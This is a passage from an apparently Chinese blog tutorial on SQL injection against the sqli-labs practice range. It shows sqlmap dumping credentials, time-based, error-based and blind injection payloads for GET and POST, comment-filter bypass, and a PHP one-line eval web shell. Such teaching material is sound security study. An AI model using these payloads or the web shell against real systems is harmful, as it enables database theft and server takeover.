<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">[</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">4</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> tables]</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">+----------+</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">|</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> emails</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">   |</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">|</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> referers</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> |</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">|</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> uagents</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">  |</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">|</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> users</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">    |</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">+----------+</span></span></code></pre></div><p>然后再基于当前的表，可以继续爆破表的数据：</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">┌──(root㉿Seso</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">)-[~]</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">└─#</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> &quot;http://localhost/Less-8/?id=1&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> --batch</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> -D</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> security</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> -T</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> users</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> --dump</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">Database:</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> security</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">Table:</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> users</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">[</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">13</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> entries]</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">+----+------------+----------+</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">|</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> id</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> password</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">   |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> username</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> |</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">+----+------------+----------+</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">|</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> 1</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">  |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> Dumb</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">       |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> Dumb</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">     |</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">|</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> 2</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">  |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> I-kill-you</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> Angelina</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> |</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">|</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> 3</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">  |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> p@ssword</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">   |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> Dummy</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">    |</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">|</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> 4</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">  |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> crappy</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">     |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> secure</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">   |</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">|</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> 5</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">  |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> stupidity</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">  |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> stupid</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">   |</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">|</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> 6</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">  |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> genious</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">    |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> superman</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> |</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">|</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> 7</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">  |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> mob!le</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">     |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> batman</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">   |</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">|</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> 8</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">  |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> admin</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">      |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> admin</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">    |</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">|</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> 9</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">  |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> admin1</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">     |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> admin1</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">   |</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">|</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> 10</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> admin2</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">     |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> admin2</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">   |</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">|</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> 11</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> admin3</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">     |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> admin3</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">   |</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">|</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> 12</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> dumbo</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">      |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> dhakkan</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">  |</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">|</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> 14</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> admin4</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">     |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> admin4</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">   |</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">+----+------------+----------+</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">[</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">00</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">:32:24] [INFO] table </span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39;\`security\`.users&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> dumped to CSV file </span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39;/root/.local/share/sqlmap/output/localhost/dump/security/users.csv&#39;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">[</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">00</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">:32:24] [INFO] fetched data logged to text files under </span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39;/root/.local/share/sqlmap/output/localhost&#39;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">[</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">*</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">] ending @ 00:32:24 /2024-05-07/</span></span></code></pre></div><h3 id="_4-3-时间盲注" tabindex="-1">4.3 时间盲注 <a class="header-anchor" href="#_4-3-时间盲注" aria-label="Permalink to &quot;4.3 时间盲注&quot;">​</a></h3><p>时间盲注：web页面只返回一个正常页面利用页面响应时间不同，逐个猜解数据。</p><p>前提是数据库会执行命令代码，只是不反馈页面信息。</p><div class="tip custom-block"><p class="custom-block-title">时间盲注常用函数</p><p>函数if (condition,true,false) condition为条件，true当条件为真的时返回的值，flase当条件为假时返回的值</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> if</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">ascii</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(substr((</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> database</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">()),</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">))</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">&gt;</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">100</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,sleep(</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">),sleep(</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">3</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">));</span></span></code></pre></div></div><p>通过时间响应判断当前的数据库名的长度：</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">id</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39; and if(ascii(substr((select database()),1,1))&gt;=120,sleep(0),sleep(3))--+</span></span></code></pre></div><h3 id="_4-4-文件上传" tabindex="-1">4.4 文件上传 <a class="header-anchor" href="#_4-4-文件上传" aria-label="Permalink to &quot;4.4 文件上传&quot;">​</a></h3><p>使用如下命令查看当前的靶场或者是数据库是否开启了读写文件的权限：</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">MariaDB [(none)]</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> show variables </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">like</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> &#39;%secure%&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">+</span><span style="--shiki-light:#6A737D;--shiki-dark:#768390;">--------------------------+-------+</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">| Variable_name            | </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">Value</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> |</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">+</span><span style="--shiki-light:#6A737D;--shiki-dark:#768390;">--------------------------+-------+</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">| require_secure_transport | </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">OFF</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">   |</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">| secure_auth              | </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">ON</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">    |</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">| secure_file_priv         |       |</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">| secure_timestamp         | </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">NO</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">    |</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">+</span><span style="--shiki-light:#6A737D;--shiki-dark:#768390;">--------------------------+-------+</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">4</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> rows</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> in</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> set</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> (</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">0</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">.</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">001</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> sec)</span></span></code></pre></div><p><img src="https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/image-20240507154553628.png?imageSlim" alt="image-20240507154553628"></p><p>这里的靶场环境要使用level-7，然后测试注入：</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">id</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39;))--+</span></span></code></pre></div><p>这里涉及到了文件上传指令，也就是一句话木马：</p><div class="language-php vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">php</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">&lt;?</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">php</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> @</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">eval</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">($_POST[</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39;password&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">]);</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">?&gt;</span></span></code></pre></div><h2 id="五、post注入" tabindex="-1">五、POST注入 <a class="header-anchor" href="#五、post注入" aria-label="Permalink to &quot;五、POST注入&quot;">​</a></h2><h3 id="_5-1-union注入" tabindex="-1">5.1 union注入 <a class="header-anchor" href="#_5-1-union注入" aria-label="Permalink to &quot;5.1 union注入&quot;">​</a></h3><p>这里的环境使用level-11：</p><p><img src="https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/image-20240507013805595.png" alt="image-20240507013805595"></p><p>我这里通过抓包，可以知道当前的数据的传参是如下：</p><p><img src="https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/image-20240507013937803.png" alt="image-20240507013937803"></p><p>然后可以保证当前的uname的字段后面使用注入测试，并保证条件为真，也就是使用or。</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">uname</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=admin</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39; union select 1,2 #&amp;passwd=admin&amp;submit=Submit</span></span></code></pre></div><p>然后我这样就是登录成功的，后面的密码直接使用#号注释掉了。</p><p><img src="https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/image-20240507014101914.png" alt="image-20240507014101914"></p><p>然后可以使用如下注入查看当前的数据库表：</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">uname</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39; union select 1,(select database()) #&amp;passwd=admin&amp;submit=Submit</span></span></code></pre></div><h3 id="_5-2-报错注入" tabindex="-1">5.2 报错注入 <a class="header-anchor" href="#_5-2-报错注入" aria-label="Permalink to &quot;5.2 报错注入&quot;">​</a></h3><p>这里使用level-13的靶场进行测试，当前是提交用户<code>admin&#39;</code>看是否报错，如果有报错，查看报错显示的闭合符号，然后推断出来是否使用<code>&#39;)</code>。</p><p>这个联合查询的目的是将数据库中的表数量和当前数据库的名称（通过 <code>(select database())</code> 获取）连接起来，并通过 <code>concat_ws</code> 函数使用破折号连接。而 <code>floor(rand(0)*2)</code> 则是生成一个随机数，作为联合查询中的一个列，以确保语法的正确性。</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">passwd</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=admin</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">&amp;submit</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">Submit&amp;uname</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=admin</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39;) union select count(*),concat_ws(&#39;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">-</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39;,(select database()),floor(rand(0)*2)) as a from information_schema.tables group by a#</span></span></code></pre></div><p>然后再修改concat_ws函数的第二个值：</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">passwd</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=admin</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">&amp;submit</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">Submit&amp;uname</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=admin</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39;) union select count(*),concat_ws(&#39;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">-</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2)) as a from information_schema.tables group by a#</span></span></code></pre></div><p>这样就可以使用报错注入查看当前的字段信息：</p><p><img src="https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/image-20240507151057005.png?imageSlim" alt="image-20240507151057005"></p><h3 id="_5-3-盲注" tabindex="-1">5.3 盲注 <a class="header-anchor" href="#_5-3-盲注" aria-label="Permalink to &quot;5.3 盲注&quot;">​</a></h3><blockquote><p>第一种是布尔盲注</p></blockquote><p>这里的盲注使用的是level-15的靶场环境，然后使用or的方式测试一下是否支持布尔盲注</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">passwd</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=admin</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">&amp;submit</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">Submit&amp;uname</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=admin</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39; or 1=2#</span></span></code></pre></div><p>使用ascii函数进行post盲注和上面的get差不多。</p><ul><li>继续使用ascii去测试当前的数据库的第一个字母的长度，测试到115是执行成功的，所以可以挨个进行测试。</li></ul><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">passwd</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=admin</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">&amp;submit</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">Submit&amp;uname</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=admin</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39; or ascii(substring((select database()),1,1))=115#</span></span></code></pre></div><blockquote><p>第二种是时间盲注</p></blockquote><p>使用if函数配合ascii函数实现的时间盲注。</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">passwd</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=admin</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">&amp;submit</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">Submit&amp;uname</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=admin</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39; or if(ascii(substring((select database()),1,1))&gt;=115,sleep(0),sleep(2))#</span></span></code></pre></div><h2 id="六、sql注入绕过" tabindex="-1">六、SQL注入绕过 <a class="header-anchor" href="#六、sql注入绕过" aria-label="Permalink to &quot;六、SQL注入绕过&quot;">​</a></h2><h3 id="_6-1-注释符号过滤" tabindex="-1">6.1 注释符号过滤 <a class="header-anchor" href="#_6-1-注释符号过滤" aria-label="Permalink to &quot;6.1 注释符号过滤&quot;">​</a></h3><p>在思考后端怎么去写一条sql查询语句的时候，比如根据当前的id 查询：</p><ul><li>在如下的查询语句中，其实<code>$id</code>被单引号包裹起来的，怎么去写注入都不行，因为是注释掉了，所以这里需要绕过这种注释符号</li></ul><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">sql=</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;</span></span></code></pre></div><p>常用的注释符号</p><ul><li><code>--</code></li><li><code>#</code></li><li><code>%23</code></li><li><code>--+</code></li></ul><p>有些网站源代码会直接替换掉注释符号：</p><p><img src="https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/image-20240507162425151.png?imageSlim" alt="image-20240507162425151"></p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">id</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=-</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39; union select 1,(select database()),3 or &#39;</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39;=&#39;</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span></span></code></pre></div><p>如下是数字型和字符型的绕过：</p><p><img src="https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/image-20240507162818338.png?imageSlim" alt="image-20240507162818338"></p><h3 id="_6-2-and和or绕过" tabindex="-1">6.2 and和or绕过 <a class="header-anchor" href="#_6-2-and和or绕过" aria-label="Permalink to &quot;6.2 